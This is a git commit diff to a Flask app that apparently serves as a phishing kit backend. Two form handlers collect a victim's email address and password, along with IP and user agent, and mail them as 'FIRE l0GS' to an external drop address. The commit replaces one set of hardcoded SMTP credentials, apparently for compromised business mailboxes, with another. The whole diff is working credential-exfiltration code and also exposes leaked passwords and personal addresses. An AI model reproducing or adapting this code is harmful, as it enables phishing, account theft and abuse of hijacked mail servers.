72a227fbea074eb0ade38dbb17ad41348b64fd4f
saintt25 <151038948+saintt25@users.noreply.github.com>
2025-05-15 05:58:19 -0500

    Update main.py

--- main.py
+++ main.py
@@ -176,10 +176,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'eissa@waterworldwaterpark.com'
-        sender_emaill = 'eissa'
-        receiver_email = 's.toihidi@gmail.com'
-        password = 'EISSA47314A'
+        sender_email = 'gm.alkhobar@habitathotel.com.sa'
+        sender_emaill = 'gm.alkhobar'
+        receiver_email = 'otishe011@yandex.com'
+        password = 'cab1.net#6908'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -198,7 +198,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.waterworldwaterpark.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.habitathotel.com.sa', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -217,10 +217,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'eissa@waterworldwaterpark.com'
-        sender_emaill = 'eissa'
-        receiver_email = 's.toihidi@gmail.com'
-        password = 'EISSA47314A'
+        sender_email = 'gm.alkhobar@habitathotel.com.sa'
+        sender_emaill = 'gm.alkhobar'
+        receiver_email = 'otishe011@yandex.com'
+        password = 'cab1.net#6908'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -239,7 +239,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('mail.waterworldwaterpark.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.habitathotel.com.sa', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
